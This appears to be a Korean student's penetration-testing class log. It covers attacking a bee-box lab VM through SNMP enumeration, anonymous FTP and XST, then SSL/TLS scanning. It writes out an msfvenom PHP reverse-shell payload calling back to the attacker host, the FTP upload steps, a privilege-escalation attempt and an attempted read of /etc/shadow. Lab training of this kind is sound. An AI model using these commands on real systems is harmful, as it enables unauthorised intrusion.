@@ -1,0 +1,175 @@
+<h1
+id="인프라모의해킹-인프라-보안-수업---서버-침투-킬체인-및-ssltls-심층-취약점-진단">[인프라/모의해킹]
+인프라 보안 수업 - 서버 침투 킬체인 및 SSL/TLS 심층 취약점 진단</h1>
+<p><strong>날짜:</strong> 2026년 6월 29일 <strong>주제:</strong>
+bee-box, Kali, Metasploit, Nmap, Wireshark, SSL/TLS 진단</p>
+<hr />
+<h2 id="오늘-배운-내용-상세-요약">📝 오늘 배운 내용 상세 요약</h2>
+<h3 id="초기-정찰-및-정보-수집-reconnaissance-enumeration">1. 초기 정찰
+및 정보 수집 (Reconnaissance &amp; Enumeration)</h3>
+<ul>
+<li><strong>SNMP 취약점 스캔:</strong> Metasploit의
+<code>snmp_enum</code> 모듈을 사용하여 타겟 서버(192.168.55.150)의
+운영체제 정보(Linux 2.6.24)와 네트워크 인터페이스 정보를 성공적으로
+탈취했습니다 (Community String public 기본값 악용).</li>
+<li><strong>익명 FTP 접근 취약점 식별:</strong> Nmap의
+<code>ftp-anon.nse</code> 스크립트를 통해 포트 21번(FTP)에서 익명
+로그인(Anonymous FTP)이 허용됨을 확인했으며, 해당 디렉토리에 WebDAV 관련
+파일(<code>b374k-3.2.2.php</code> 등)이 혼재되어 있음을
+파악했습니다.</li>
+</ul>
+<h3 id="취약점-악용-및-침투-exploitation">2. 취약점 악용 및 침투
+(Exploitation)</h3>
+<ul>
+<li><strong>XST 취약점 분석:</strong> HTTP TRACE 메서드가 활성화된
+서버에서 세션 쿠키(<code>PHPSESSID</code>)가 어떻게 노출될 수 있는지
+Burp Suite를 통해 패킷 단위로 분석했습니다.</li>
+<li><strong>리버스 쉘(Reverse Shell) 제작 및 업로드:</strong>
+<code>msfvenom</code>을 활용하여 공격자 PC(192.168.55.161)의 포트 4445로
+역연결을 시도하는 PHP 리버스 TCP 페이로드(<code>hack.php</code>)를
+생성(크기: 1115 bytes)하고, 취약한 FTP 프로토콜을 통해 타겟 서버의
+WebDAV 디렉토리 경로에 성공적으로 업로드했습니다.</li>
+<li><strong>Meterpreter 쉘 획득 및 권한 상승 시도:</strong> 업로드된
+<code>hack.php</code>를 실행하여 쉘 세션을 획득한 후, 커널 익스플로잇
+모듈(<code>sock_sendpage</code>)을 통해 root 권한 상승(Privilege
+Escalation)을 시도하였으나 패치 적용 또는 조건 불일치로
+실패(<code>not-vulnerable</code>)했습니다. 이에 따라
+<code>/etc/shadow</code> 파일 열람 시도 시 <code>Operation failed</code>
+반환됨을 확인했습니다.</li>
+</ul>
+<h3 id="통신-보안-및-ssltls-심층-진단">3. 통신 보안 및 SSL/TLS 심층
+진단</h3>
+<ul>
+<li><strong>패킷 캡처 (Wireshark):</strong> FTP 통신 시 로그인 자격
+증명(ID/PW)이 평문으로 전송되는 취약점과 FTP 무차별 대입
+공격(Brute-Force) 시 나타나는 <code>LOGIN FAILED</code> 패킷 패턴을
+분석했습니다.</li>
+<li><strong>암호화 통신(HTTPS) 취약점 진단:</strong>
+<code>sslyze</code>, <code>testssl.sh</code>, <code>O-Saft</code>
+스캐너를 이용하여 9443 포트를 진단하여, 치명적인 구형 프로토콜 및 암호화
+알고리즘 결함을 다수 발견했습니다.</li>
+</ul>
+<hr />
+<h2 id="심층-분석-및-진단-결과-요약">🔍 심층 분석 및 진단 결과 요약</h2>
+<h3 id="ssltls-취약점-진단-결과-요약-testssl.sh-sslyze-종합">[SSL/TLS
+취약점 진단 결과 요약 (testssl.sh &amp; sslyze 종합)]</h3>
+<p>타겟 서버(192.168.55.150:9443) 스캔 결과 인프라 보안상 즉각적인
+조치가 필요한 심각한 취약점들이 식별되었습니다. * <strong>구형 프로토콜
+사용 (POODLE &amp; DROWN 취약점):</strong> 안전하지 않은 SSLv2, SSLv3
+프로토콜이 활성화되어 있어 다운그레이드 공격에 노출됩니다. *
+<strong>취약한 암호화 알고리즘 (SWEET32, FREAK, RC4):</strong> 64-bit
+블록 암호화(3DES) 및 해독이 쉬운 EXPORT RSA, RC4-MD5, RC4-SHA 방식이
+허용되어 있어 패킷 스니핑 시 복호화 위험이 높습니다. * <strong>안전성
+기준 미달 인증서:</strong> RSA Key Size가 1024-bit로 권장치(최소
+2048-bit)에 미달하며, 유효기간(2018년 만료)이 지난 자체
+서명(Self-Signed) 인증서를 사용 중입니다. * <strong>기타 보안 설정
+누락:</strong> 확장 마스터 시크릿(Extended Master Secret) 및
+<code>TLS_FALLBACK_SCSV</code> 미지원 상태를 확인했습니다.</p>
+<hr />
+<h2 id="주요-트러블슈팅-troubleshooting-내역">🛠 주요 트러블슈팅
+(Troubleshooting) 내역</h2>
+<ul>
+<li><strong>Q. Metasploit 모듈 로드 실패 (Failed to load
+module)</strong>
+<ul>
+<li><strong>원인:</strong> <code>samba_symlink_traversal</code> 모듈
+입력 시 symlink를 synlink로 잘못 기입한 단순 오타.</li>
+<li><strong>해결:</strong> 철자 수정 및 <code>use 1</code>과 같이 인덱스
+번호를 활용하여 정확하게 로드.</li>
+</ul></li>
+<li><strong>Q. Metasploit 익스플로잇 에러
+(Msf::OptionValidateError)</strong>
+<ul>
+<li><strong>원인:</strong> 모듈 실행 전 타겟 IP인 <code>RHOSTS</code>
+값을 지정하지 않음.</li>
+<li><strong>해결:</strong> 항상 <code>show options</code> 명령어로 필수
+설정(Required: Yes) 확인 후 <code>set RHOSTS 192.168.55.150</code> 지정
+습관화.</li>
+</ul></li>
+<li><strong>Q. 리버스 핸들러 바인딩 에러 (Handler failed to bind to
+192.168.55.161:4445)</strong>
+<ul>
+<li><strong>원인:</strong> 공격자 쪽에 수신 대기 포트(4445)를 열려
+했으나 Address already in use (이미 해당 포트를 다른 프로세스나
+백그라운드 세션이 사용 중) 발생.</li>
+<li><strong>해결:</strong> 활성화된 백그라운드 세션을 종료하거나 LPORT
+값을 충돌이 없는 다른 포트(예: 4446)로 변경하여 재실행.</li>
+</ul></li>
+<li><strong>Q. Burp Suite Forward 시 파일 다운로드 미발생</strong>
+<ul>
+<li><strong>원인:</strong> Proxy의 Forward 기능은 단순히 패킷을 서버로
+통과시키는 역할이며 다운로드 기능이 아님.</li>
+<li><strong>해결:</strong> Raw 패킷 텍스트를 직접 복사하여 Kali
+터미널에서 <code>nano sm_xst.php</code>를 이용해 파일로 직접 구성.</li>
+</ul></li>
+</ul>
+<hr />
+<h2 id="오늘의-회고-및-실무-다짐">💭 오늘의 회고 및 실무 다짐</h2>
+<h3 id="배운-점">📌 배운 점</h3>
+<ul>
+<li>공격 대상의 취약한 서비스를 찾아 페이로드를 업로드하고 역연결 쉘을
+획득하는 일련의 과정을 직접 구축해 보며 시스템 침투의 흐름을 완전히
+체득했습니다.</li>
+<li>특히 진단 스크립트 결과를 해석하며 취약점의 근본 원인을 파악하는
+시야를 넓혔습니다.</li>
+</ul>
+<h3 id="개선할-점-및-인적-오류human-error-극복">🚨 개선할 점 및 인적
+오류(Human Error) 극복</h3>
+<ul>
+<li>터미널 실습 중 대소문자(<code>LHOST</code>), 단어 철자, 옵션 누락 등
+사소한 실수가 침투 실패로 직결됨을 경험했습니다. 실무 환경에서는 이러한
+인적 오류를 줄이기 위해 스크립트화하거나 크로스 체크하는 습관이 중요함을
+깨달았습니다.</li>
+<li><code>msfvenom</code> 명령어를 입력하면서 <code>LPORT=4445</code>
+대신 <code>lport-4445</code>와 같이 옵션을 잘못 입력하는 실수를
+했습니다. (사용한 명령어:
+<code>sudo msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.55.161 LPORT=4445 &gt; /home/red/hack.php</code>)</li>
+<li><strong>💡 멘토님(정재호) 피드백 적용:</strong> 항상
+<code>msfvenom -p ... --list-options</code>로 먼저 파라미터 목록을
+확인하는 습관을 들여 실수를 줄이겠습니다!</li>
+</ul>
+<h3 id="실무를-위한-액션-플랜">💡 실무를 위한 액션 플랜</h3>
+<ul>
+<li>보안 포털 팀 프로젝트에서 웹 서버 및 인프라를 구축할 때, 오늘 확인한
+구형 SSL/TLS 프로토콜(RC4, SSLv3 등)을 원천 차단하고 TLS 1.2 이상 기반의
+강력한 Cipher Suite를 적용할 계획입니다.</li>
+<li>네트워크 모니터링(NOC) 업무 수행 시, Wireshark로 분석했던 FTP 평문
+자격증명 노출 패턴이나 Brute-Force 공격 시 발생하는 반복적인 패킷 흐름을
+탐지 룰(Snort/Suricata 등)과 매칭하는 훈련을 지속하겠습니다.</li>
+</ul>
+<h3 id="함께-나누고-싶은-점">🤝 함께 나누고 싶은 점</h3>
+<ul>
+<li><strong>스캐너 교차 검증의 중요성:</strong> 취약점 진단 시 O-Saft,
+sslyze, testssl.sh 등 여러 도구를 함께 사용해보니 각 도구마다 강점이
+다르고 출력되는 결과의 깊이가 달랐습니다. 실무에서도 하나의 도구만
+맹신하지 않고 다양한 방법론으로 크로스 체크해야 오탐을 줄일 수 있다는
+점을 팀원들과 공유하고 싶습니다.</li>
+<li><strong>방어자(관제) 관점에서의 패킷 분석:</strong> 단순히
+익스플로잇에 성공한 것에 그치지 않고 와이어샤크(Wireshark)를 통해 공격
+패킷(FTP 평문 노출, 로그인 실패 로그)을 직접 눈으로 확인한 경험이 가장
+인상 깊었습니다. 훗날 인프라/네트워크 관제 실무 시 이러한 비정상 트래픽
+흐름을 어떻게 식별할 것인지에 대한 시야를 넓힐 수 있었습니다.</li>
+<li><strong>사소한 휴먼 에러 주의:</strong> Metasploit 설정 시 IP 주소
+누락이나 <code>samba_symlink_traversal</code>의
+오타(<code>synlink</code>) 하나가 공격 실패로 직결됨을 경험했습니다.
+실무 인프라 환경에서는 명령어 한 줄이 큰 장애를 일으킬 수 있으므로, 실행
+전 옵션을 꼼꼼히 크로스 체크하는 습관을 들여야 합니다.</li>
+</ul>
+<hr />
+<h2 id="핵심-명령어-레퍼런스-내-실습-환경-기준">💻 핵심 명령어 레퍼런스
+(내 실습 환경 기준)</h2>
+<p><strong>1. SNMP 취약점 스캔</strong> ```bash msfconsole use
+auxiliary/scanner/snmp/snmp_enum set RHOSTS 192.168.55.150 run</p>
+<ol start="2" type="1">
+<li><p>역연결 페이로드 생성 (공격자 IP: 192.168.55.161) sudo msfvenom -p
+php/meterpreter/reverse_tcp LHOST=192.168.55.161 LPORT=4445 &gt;
+/home/red/hack.php</p></li>
+<li><p>Nmap을 이용한 FTP 익명 로그인 취약점 진단 sudo nmap
+192.168.55.150 -p 21 –script ftp-anon.nse</p></li>
+<li><p>FTP 접속 및 페이로드 업로드 sudo ftp 192.168.55.150 # ID:
+anonymous, PW: [엔터] ftp&gt; put hack.php</p></li>
+<li><p>O-Saft, sslyze, testssl.sh 진단 명령어 (포트 9443 기준) sudo
+./o-saft.pl +check -v 192.168.55.150:9443 sudo sslyze –compression
+192.168.55.150:9443 sudo sslyze –slow_connection 192.168.55.150:9443
+sudo ./testssl.sh -U 192.168.55.150:9443</p></li>
+</ol>
